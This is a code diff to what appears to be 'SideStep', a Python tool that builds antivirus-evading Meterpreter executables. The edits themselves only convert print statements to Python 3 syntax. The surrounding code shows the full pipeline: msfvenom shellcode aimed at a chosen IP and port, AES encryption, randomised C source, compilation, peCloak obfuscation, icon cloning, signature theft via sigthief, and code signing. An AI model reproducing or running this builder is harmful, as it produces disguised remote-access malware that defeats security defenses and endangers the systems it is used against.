@@ -83,7 +83,7 @@ def main(argv):
   port = args['port']
   clOptions = '/GS /GL /analyze- /Zc:wchar_t /Zi /Gm /O2 /sdl /fp:precise /D WIN32 /D "NDEBUG" /D "_CONSOLE" /D "_UNICODE" /D "UNICODE" /errorReport:prompt /WX- /Zc:forScope /Gd /Oy- /Oi /MT /EHsc /Fe"' + settings.exeDir + path_delim + args['exe'] + '" /Fo"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '.obj" /Fd"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '" /nologo /I"' + settings.vsPath + path_delim + 'include" /I"' + settings.vsPath + path_delim + 'atlmfc' + path_delim + 'include" /I"' + settings.sdkPathIncl + '" /I"' + settings.kitPathIncl + '" /I"' + settings.winApiIncl + '" "' + settings.sdkPathLib + path_delim + 'AdvAPI32.Lib" "' + settings.sdkPathLib + path_delim + 'Uuid.Lib" "' + settings.sdkPathLib + path_delim + 'Kernel32.Lib" "' + settings.kitPathLib + path_delim + 'libucrt.lib" "' + settings.vsMsvcrtLib + path_delim + 'libcpmt.lib" "' + settings.vsMsvcrtLib + path_delim + 'libcmt.lib" "' + settings.vsMsvcrtLib + path_delim + 'oldnames.lib" "' + settings.vsMsvcrtLib + path_delim + 'libvcruntime.lib" ' + settings.cryptLibPath + ' '
   
-  print '[+]  Preparing to create a Meterpreter executable'
+  print('[+]  Preparing to create a Meterpreter executable')
 
   # Set the command line values
   sourceFile = open(settings.sourceDir + path_delim + args['file'], 'w')
@@ -115,13 +115,13 @@ def main(argv):
   diffieMsg2 = rng.genData(settings.dataLen)
   curTimeVar = rng.genVar(settings.randomVarSize)
 
-  print '[-]\tCompiling CryptoPP library'
+  print('[-]\tCompiling CryptoPP library')
   cryptopp.compileCryptoPP(path_delim, settings.sourceDir, settings.vsPath, settings.sdkPathIncl, settings.kitPathIncl, settings.winApiIncl, settings.vsToolsPath)
 
-  print '[-]\tGenerating the Meterpreter shellcode'
+  print('[-]\tGenerating the Meterpreter shellcode')
   clearPayload = msfpayload.payloadGenerator(settings.msfpath, settings.msfvenom, settings.msfmeterpreter, ip, port, settings.MsfOptions)
 
-  print '[-]\tEncrypting Meterpreter executable'
+  print('[-]\tEncrypting Meterpreter executable')
   encPayload = encryption.aesCbc(settings.encKeyLen, settings.encIvLen, encKey, encIv, clearPayload)
 
   # int main() vars
@@ -142,7 +142,7 @@ def main(argv):
   virtAllocAddr = rng.genVar(settings.randomVarSize)
   virtAllocPage_size = rng.genVar(settings.randomVarSize)
 
-  print '[-]\tGenerating the source code for the executable'
+  print('[-]\tGenerating the source code for the executable')
   src = codesegments.cHeaders() + "\n"
   src += codesegments.execHeaderStub(execFuncVar, execParamVar) + "\n"
   src += "USING_NAMESPACE(CryptoPP)\n"
@@ -153,28 +153,28 @@ def main(argv):
   src += codesegments.mainStub(mainSt, heuristicFuncVar, mainDecrypted, mainEncodeKey, encKey, mainEncodeIv, encIv, mainDecodeCipher, mainFuncPayload, aesPayloadVar, mainAesDecryption, mainCbcDecryption, mainStfDecryptor, virtAllocFuncVar) + "\n"
   src += codesegments.virtualAllocStub(virtAllocFuncVar, virtAllocFuncParam, virtAllocLen, virtAllocPid, virtAllocCode, virtAllocAddr, virtAllocPage_size, execFuncVar, execParamVar) + "\n"
 
-  print '[-]\tWriting the source code to ' + settings.sourceDir + path_delim + args['file']
+  print('[-]\tWriting the source code to ' + settings.sourceDir + path_delim + args['file'])
   # Write main source
   sourceFile.write(src)
   sourceFile.close()
   
   # Compile SideStep
-  print '[-]\tCompiling the executable to ' + settings.exeDir + path_delim + args['exe']
+  print('[-]\tCompiling the executable to ' + settings.exeDir + path_delim + args['exe'])
   subprocess.Popen(settings.vsToolsPath + path_delim + 'cl.exe ' + clOptions + settings.sourceDir + path_delim + args['file'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
   time.sleep(30)
 
   if settings.useStrip == 1:
-    print '[-]\tStripping debugging symbols'
+    print('[-]\tStripping debugging symbols')
     subprocess.Popen('strip.exe -s ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     time.sleep(5)
 
   if settings.useDitto == 1:
-    print '[-]\tAdding details and icon of ' + settings.dittoExe + ' to the executable'
+    print('[-]\tAdding details and icon of ' + settings.dittoExe + ' to the executable')
     subprocess.Popen(settings.dittoPath + 'ditto.exe ' + settings.dittoExe + ' ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     time.sleep(5)
 
   if settings.usePeCloak == 1:
-    print '[-]\tEncoding the PE file with peCloak'
+    print('[-]\tEncoding the PE file with peCloak')
     subprocess.Popen('python ' + settings.peCloakPath + 'peCloak.py ' + os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
     time.sleep(60)
@@ -184,7 +184,7 @@ def main(argv):
         os.rename(os.getcwd() + path_delim + settings.exeDir + path_delim + file, os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'])
 
   if settings.useSigThief == 1:
-    print '[-]\tStripping the signature from ' + settings.sigThiefExe + ' and applying to SideStep'
+    print('[-]\tStripping the signature from ' + settings.sigThiefExe + ' and applying to SideStep')
     shutil.copy(settings.sigThiefExe, os.getcwd() + path_delim + settings.exeDir + path_delim + settings.sigThiefExeName)
     subprocess.Popen('python ' + settings.sigThiefPath + 'sigthief.py -i .' + path_delim + settings.exeDir + path_delim + settings.sigThiefExeName + ' -t .' + path_delim + settings.exeDir + path_delim + args['exe'] + ' -o .' + path_delim + settings.exeDir + path_delim + args['exe'].split('.')[0] + '_sig.exe', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
@@ -199,12 +199,12 @@ def main(argv):
   #  subprocess.Popen(settings.signcodePath + ' -spc ' + settings.certSPC + ' -v ' + settings.certPVK + ' -a sha1 -$ commercial ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
     # Sign with Microsoft's signtool
-    print '[-]\tSigning executable with certificate at ' + settings.signCert
+    print('[-]\tSigning executable with certificate at ' + settings.signCert)
     subprocess.Popen(settings.signcodePath + ' sign /f ' + settings.signCert + ' /fd ' + settings.signHash + ' /n ' + settings.signSubject + ' ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
     time.sleep(3)
 
-  print '[*]  Process complete!'
+  print('[*]  Process complete!')
 
 if __name__ == '__main__':
   main(sys.argv[1:])
